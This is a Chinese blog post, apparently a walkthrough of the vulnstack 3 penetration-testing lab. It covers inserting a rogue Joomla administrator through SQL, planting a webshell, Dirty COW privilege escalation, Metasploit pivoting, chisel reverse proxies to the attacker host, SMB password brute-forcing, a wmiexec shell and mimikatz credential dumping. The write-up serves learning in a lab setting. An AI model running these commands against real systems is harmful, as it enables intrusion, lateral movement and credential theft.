<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="环境搭建vmware直接打开，每台都设置好了vmnet2，所以在 编辑-&gt;虚拟网络编辑器 添加一个vmnet2（192.168.93.0&#x2F;24）即可。 外网渗透123456INSERT INTO &#96;am2zu_users&#96;   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastRe">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透学习-vulnstack（三）">
<meta property="og:url" content="https://blog.b1ank.top/2021/09/21/att&ck03/index.html">
<meta property="og:site_name" content="b1ank&#39;s blog">
<meta property="og:description" content="环境搭建vmware直接打开，每台都设置好了vmnet2，所以在 编辑-&gt;虚拟网络编辑器 添加一个vmnet2（192.168.93.0&#x2F;24）即可。 外网渗透123456INSERT INTO &#96;am2zu_users&#96;   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastRe">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.b1ank.top/2021/09/21/att&ck03/image-20210922193332179.png">
<meta property="og:image" content="https://blog.b1ank.top/2021/09/21/att&ck03/image-20210923214824110.png">
<meta property="og:image" content="https://blog.b1ank.top/2021/09/21/att&ck03/image-20210923215241082.png">
<meta property="article:published_time" content="2021-09-20T16:00:00.000Z">
<meta property="article:modified_time" content="2021-09-23T14:28:01.980Z">
<meta property="article:author" content="b1ank">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.b1ank.top/2021/09/21/att&ck03/image-20210922193332179.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>内网渗透学习-vulnstack（三）</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post " href="/2021/09/19/att&ck02/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/09/21/att&amp;ck03/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&text=内网渗透学习-vulnstack（三）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&is_video=false&description=内网渗透学习-vulnstack（三）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网渗透学习-vulnstack（三）&body=Check out this article: https://blog.b1ank.top/2021/09/21/att&amp;ck03/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&name=内网渗透学习-vulnstack（三）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&t=内网渗透学习-vulnstack（三）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">外网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        内网渗透学习-vulnstack（三）
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">b1ank</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-09-20T16:00:00.000Z" itemprop="datePublished">2021-09-21</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vmware直接打开，每台都设置好了vmnet2，所以在 编辑-&gt;虚拟网络编辑器 添加一个vmnet2（192.168.93.0/24）即可。</p>
<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>扫目录发现数据库配置文件，连接数据库添加管理员账号<code>Admin2/secret</code>，编辑模板插入一句话木马</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.101/templates/beez3/jsstrings.php">http://192.168.1.101/templates/beez3/jsstrings.php</a></p>
<p>用蚁剑的绕过disable_functions插件绕过disable_functions</p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>获取一些基本信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/version</span><br><span class="line">Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) <span class="comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019</span></span><br><span class="line"></span><br><span class="line">$ ifconfig</span><br><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:68186 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:62733 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:9134928 (9.1 MB)  TX bytes:18190631 (18.1 MB)</span><br><span class="line">          </span><br><span class="line">$ netstat -anlpt</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:64162         0.0.0.0:*               LISTEN      2734/php        </span><br><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:63828         0.0.0.0:*               LISTEN      2736/php        </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 192.168.93.120:80       192.168.93.100:52482    ESTABLISHED -               </span><br><span class="line">tcp6       1      0 192.168.93.120:80       192.168.93.100:52453    CLOSE_WAIT  -               </span><br><span class="line">tcp6       1      0 192.168.93.120:80       192.168.93.100:52444    CLOSE_WAIT  -</span><br><span class="line"></span><br><span class="line">$ cat /tmp/mysql/test.txt</span><br><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>

<p>发现有账号密码，登录，搜集一些信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[firefart@localhost wwwuser]# cat &#x2F;proc&#x2F;version </span><br><span class="line">Linux version 2.6.32-431.el6.x86_64 (mockbuild@c6b8.bsys.dev.centos.org) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC) ) #1 SMP Fri Nov 22 03:15:09 UTC 2013</span><br><span class="line">[firefart@localhost wwwuser]# ifconfig </span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0C:29:32:46:C9  </span><br><span class="line">          inet addr:192.168.1.101  Bcast:192.168.1.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe32:46c9&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:108622 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:51359 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:49198855 (46.9 MiB)  TX bytes:14546857 (13.8 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:32:46:D3  </span><br><span class="line">          inet addr:192.168.93.100  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe32:46d3&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:123085 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:64446 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20432904 (19.4 MiB)  TX bytes:8891741 (8.4 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:197 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:197 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:15270 (14.9 KiB)  TX bytes:15270 (14.9 KiB)</span><br></pre></td></tr></table></figure>

<p>发现nginx配置，所以是centos给ubuntu做nginx代理，并且我们拿到了这两台服务器的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[firefart@localhost wwwuser]# cat &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line">error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;</span><br><span class="line">pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">  server &#123;</span><br><span class="line">        listen  80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">         proxy_pass  http:&#x2F;&#x2F;192.168.93.120;</span><br><span class="line"></span><br><span class="line">              proxy_set_header        Host $host;</span><br><span class="line">              proxy_set_header        X-Real-IP $remote_addr;  #获取真实ip</span><br><span class="line">              proxy_connect_timeout   90;</span><br><span class="line">              proxy_send_timeout      90;</span><br><span class="line">              proxy_read_timeout      90;</span><br><span class="line">              proxy_buffer_size       4k;</span><br><span class="line">              proxy_buffers           4 32k;</span><br><span class="line">              proxy_busy_buffers_size 64k;</span><br><span class="line">              proxy_temp_file_write_size 64k;</span><br><span class="line">              proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#获取代理者的真实ip</span><br><span class="line">              proxy_redirect          off;</span><br><span class="line">				&#125;</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream  &#123;</span><br><span class="line">  upstream proxy_name &#123;</span><br><span class="line">      server 192.168.93.120:3306;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  server &#123;</span><br><span class="line">      listen 3306;</span><br><span class="line">      proxy_pass proxy_name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用<code>linux-exploit-suggester.sh</code>查一下可用提权，发现可以用脏牛</p>
<p><img src="/2021/09/21/att&ck03/image-20210922193332179.png" alt="image-20210922193332179"></p>
<p><code>use exploit/multi/script/web_delivery</code></p>
<p>上线msf（设置完target后payload就能自动补全了）</p>
<p><code>meterpreter &gt; run autoroute -s 192.168.93.0/24</code></p>
<p>添加路由，让msf进内网</p>
<p><code>use auxiliary/scanner/discovery/udp_probe</code></p>
<p>扫描存活主机，线程适当调整</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hosts                                                                                                                                                </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;                                                                                                                                                </span><br><span class="line">                                                                                                                                                     </span><br><span class="line">address        mac                name                   os_name                                   os_flavor  os_sp  purpose  info  comments         </span><br><span class="line">-------        ---                ----                   -------                                   ---------  -----  -------  ----  --------         </span><br><span class="line">192.168.1.101                     localhost.localdomain  CentOS 6.5 (Linux 2.6.32-431.el6.x86_64)                    server                          </span><br><span class="line">192.168.93.1   00:50:56:c0:00:02  workgroup              Unknown                                                     device                          </span><br><span class="line">192.168.93.10  00:0c:29:1f:54:d2  win-8ga56tnv3mv        Unknown                                                     device                          </span><br><span class="line">192.168.93.20  00:0c:29:ab:44:ec  win2008                Unknown                                                     device                          </span><br><span class="line">192.168.93.30  00:0c:29:e0:74:2b  win7                   Unknown                                                     device    </span><br></pre></td></tr></table></figure>

<p>上传<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">chisel</a>，起一个代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正向代理</span></span><br><span class="line"><span class="comment">#ubuntu web服务器执行</span></span><br><span class="line">./chisel_1.7.6_linux_amd64 server -p 3333 --socks5 </span><br><span class="line"><span class="comment">#kali 攻击机执行</span></span><br><span class="line">./chisel_1.7.6_linux_amd64 client 192.168.1.101:3333 socks  </span><br><span class="line"></span><br><span class="line"><span class="comment">#反向代理</span></span><br><span class="line"><span class="comment">#ubuntu web服务器执行</span></span><br><span class="line">./chisel client 192.168.61.104:3333 R:socks</span><br><span class="line"><span class="comment">#kali 攻击机执行</span></span><br><span class="line">./chisel server -p 3333 --reverse</span><br></pre></td></tr></table></figure>

<p>扫描端口（这里只扫了部分端口）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains nmap -sT -Pn -sV 192.168.93.10 192.168.93.20 192.168.93.30 -p 22,80,445,1433,3306,3389</span><br><span class="line">Nmap scan report for 192.168.93.10</span><br><span class="line">Host is up (13s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">22&#x2F;tcp   closed ssh</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: TEST)</span><br><span class="line">1433&#x2F;tcp closed ms-sql-s</span><br><span class="line">3306&#x2F;tcp closed mysql</span><br><span class="line">3389&#x2F;tcp closed ms-wbt-server</span><br><span class="line">Service Info: Host: WIN-8GA56TNV3MV; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.93.20</span><br><span class="line">Host is up (0.045s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">22&#x2F;tcp   closed ssh</span><br><span class="line">80&#x2F;tcp   open   http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: TEST)</span><br><span class="line">1433&#x2F;tcp open   ms-sql-s      Microsoft SQL Server 2008 10.00.1600; RTM</span><br><span class="line">3306&#x2F;tcp closed mysql</span><br><span class="line">3389&#x2F;tcp closed ms-wbt-server</span><br><span class="line">Service Info: Host: WIN2008; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows, cpe:&#x2F;o:microsoft:windows_server_2008:r2</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.93.30</span><br><span class="line">Host is up (0.046s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">22&#x2F;tcp   closed ssh</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: TEST)</span><br><span class="line">1433&#x2F;tcp closed ms-sql-s</span><br><span class="line">3306&#x2F;tcp closed mysql</span><br><span class="line">3389&#x2F;tcp closed ms-wbt-server</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 3 IP addresses (3 hosts up) scanned in 101.17 seconds</span><br></pre></td></tr></table></figure>

<p>永恒之蓝不成功，尝试爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains hydra -l administrator -P SuperWordlist&#x2F;FastPwds.txt 192.168.93.20 smb</span><br><span class="line"></span><br><span class="line">[445][smb] host: 192.168.93.20   login: administrator   password: 123qwe!ASD</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>

<p>得到密码后用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a>的wmiexec可以获取一个shell</p>
<p><code>$ proxychains wmiexec.py administrator:&#39;123qwe!ASD&#39;@192.168.93.20</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ipconfig &#x2F;all</span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : win2008</span><br><span class="line">   Primary Dns Suffix  . . . . . . . : test.org</span><br><span class="line">   Node Type . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : test.org</span><br><span class="line"></span><br><span class="line">Ethernet adapter Local Area Connection:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Description . . . . . . . . . . . : Intel(R) PRO&#x2F;1000 MT Network Connection</span><br><span class="line">   Physical Address. . . . . . . . . : 00-0C-29-AB-44-EC</span><br><span class="line">   DHCP Enabled. . . . . . . . . . . : No</span><br><span class="line">   Autoconfiguration Enabled . . . . : Yes</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::e9c2:7728:85f1:d04f%10(Preferred) </span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.93.20(Preferred) </span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</span><br><span class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-2C-55-47-00-0C-29-AB-44-EC</span><br><span class="line">   DNS Servers . . . . . . . . . . . : 192.168.93.10</span><br><span class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</span><br><span class="line"></span><br><span class="line">#查找域控</span><br><span class="line">C:\&gt;ping test.org -n 1</span><br><span class="line"></span><br><span class="line">Pinging test.org [192.168.93.10] with 32 bytes of data:</span><br><span class="line">Reply from 192.168.93.10: bytes&#x3D;32 time&lt;1ms TTL&#x3D;128</span><br></pre></td></tr></table></figure>

<p>上传mimikatz，获取明文密码</p>
